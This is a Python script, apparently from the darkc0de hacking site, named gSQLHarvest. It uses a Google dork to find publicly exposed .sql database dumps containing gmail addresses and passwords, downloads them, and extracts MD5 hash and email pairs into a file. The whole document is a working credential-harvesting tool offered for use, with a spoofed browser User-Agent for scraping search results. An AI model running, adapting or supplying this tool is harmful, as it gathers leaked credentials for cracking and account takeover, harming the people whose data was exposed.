#!/usr/bin/python 
# 
# Lets collect .sql files from google, gather the md5's and emails and be happy about it 
# code: low1z // darkc0de.com // <http://www.gnu.org/licenses/> 
# note: this tool gets wild if you mess up the max counter value, there's alot of stuff inside google, and this 
# tool fetches everything thats not filtered + larger db files (10mb+) are parsed with low performance. 
 
import urllib, urllib2, sys, re, os, time, string, commands, socket 
 
timeout = 5 
socket.setdefaulttimeout(timeout) 
counter = 10 
maxcount = 20 
d = [] 
LFN = [] 
finaloutput = 'finalsql.txt' 
tmpdir = 'tmp' 
currentdir = os.getcwd() 
os.mkdir(tmpdir) 
mailadr = '@gmail.com' 
intext2 = 'Password' 
filetype = 'sql' 
query = 'ext%3A'+filetype+'+intext%3A%40'+mailadr+'+intext%3A'+intext2 
 
def StripTags(text): 
	return re.sub(r'<[^>]*?>','', text) 
 
def download(location): 
        try: 
	        loc = urllib2.Request(location) 
	        remotefile = urllib2.urlopen(loc) 
	        localfile = open(location.split('/')[-1], 'w') 
                localfile.write(remotefile.read()) 
	        LFN.append(location.split('/')[-1]) 
	        remotefile.close() 
	        localfile.close() 
        except urllib2.URLError,socket.timeout: 
		return 
 
def cleanUp(LFN): 
	os.chdir(tmpdir) 
	for file in LFN: 
		try: 
			os.remove(file) 
		except: 
			return 
	os.chdir(currentdir) 
	print "[+]", len(LFN), "Temp Files Removed" 
 
print "           (  (            (  (   )\   (" 
print "          )\))(  (    (   )\))( ((_) ))( " 
print "         ((_))\  )\   )\ ((_))(  _  /((_)" 
print "          (()(_)((_) ((_) (()(_)| |(_))" 
print "         / _` |/ _ \/ _ \/ _` | | |/ -_) Don't be evil" 
print "+--------\__, |\___/\___/\__, | |_|\___|-------------+" 
print "|        |___/    low1z  |___/   www.darkc0de.com    |" 
print "|              google gSQLHarvest.py v1.0            |" 
print "| collecting .sql files from google, stripping md5's |" 
print "| this tool fucks up if actual file transfer is not  |" 
print "| initiated but host connect is fine. urllib2 prob!  |" 
print "+----------------------------------------------------+" 
try: 
    while counter < maxcount: 
        results_web = 'http://www.google.com/search?q='+query+'&hl=en&lr=&ie=UTF-8&start=' + repr(counter) + '&sa=N' 
        request_web = urllib2.Request(results_web) 
        request_web.add_header('User-Agent','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)') 
        opener_web = urllib2.build_opener() 
        text = opener_web.open(request_web).read() 
	strreg = re.compile('(?<=href=")(.*?)(?=")') 
	names = strreg.findall(text) 
        for name in names: 
		if name not in d: 
			if re.search(r'\(', name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name): 
				pass 
			elif re.search("google", name) or re.search("youtube", name): 
				pass 
                        else: 
				d.append(name) 
        counter +=10 
except IOError: 
	print "Can't Connect" 
 
cnx = 0 
print currentdir 
os.chdir(tmpdir) 
for site in d: 
	cnx += 1 
	try: 
        	print "[:]", cnx, "Downloading", site 
              	download(site) 
	except IOError,socket.timeout: 
        	print "[-] Remotefile not found?" 
print "\n[:]", cnx, ": Files fetched, searching for md5's... this takes some time\n" 
md5s = {} 
num = 1 
for file in LFN: 
	dbfile = open(file, "r").readlines() 
	for line in dbfile: 
		try: 
			MD5 = re.findall("[a-f0-9]"*32,line)[0]+":"+str(re.findall('\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}', line)[0]) 
			md5s[MD5] = num 
		except(IndexError): 
			pass 
		num +=1 
 
os.chdir(currentdir) 
finalfile = open(finaloutput, 'a') 
for hash in md5s: 
	print hash 
	finalfile.write(hash+"\n") 
print "\n[+] MD5s Found:",len(md5s) 
finalfile.close() 
finalfile = open(finaloutput, 'r') 
ffc = finalfile.read() 
sets = ffc.count("\n") 
print "[+] Total Hash:email Sets :", sets 
finalfile.close() 
cleanUp(LFN) 
os.rmdir(tmpdir) 
 

